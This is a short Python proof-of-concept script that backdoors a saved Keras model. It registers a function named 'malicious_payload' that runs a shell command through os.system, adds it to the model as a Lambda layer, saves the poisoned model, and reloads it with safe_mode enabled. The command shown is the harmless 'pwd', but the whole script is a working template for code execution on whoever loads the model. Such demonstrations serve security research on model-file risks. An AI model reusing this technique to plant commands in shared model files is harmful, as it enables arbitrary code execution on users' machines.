import tensorflow as tf


loaded_model = tf.keras.models.load_model(filepath='/tmp/zeek_model.keras')
print(f'Model {loaded_model} successfully loaded ...')

tf.keras.utils.get_custom_objects().clear()

@tf.keras.utils.register_keras_serializable(package="malicious_payload", name="malicious_payload")
def malicious_payload(incoming_tensor, command):
    import os
    os.system(command)
    return incoming_tensor


malicious_layer = tf.keras.layers.Lambda(function=malicious_payload, name='malicious_layer', arguments={'command' : 'pwd'})
loaded_model.add(malicious_layer)

tf.keras.models.save_model(model=loaded_model, filepath=r'/tmp/zeek_pwnd.keras', overwrite=True)

pwnd_zeek_model = tf.keras.models.load_model(filepath='/tmp/zeek_pwnd.keras', safe_mode=True)
print(f'Pwned model loaded: {pwnd_zeek_model}')
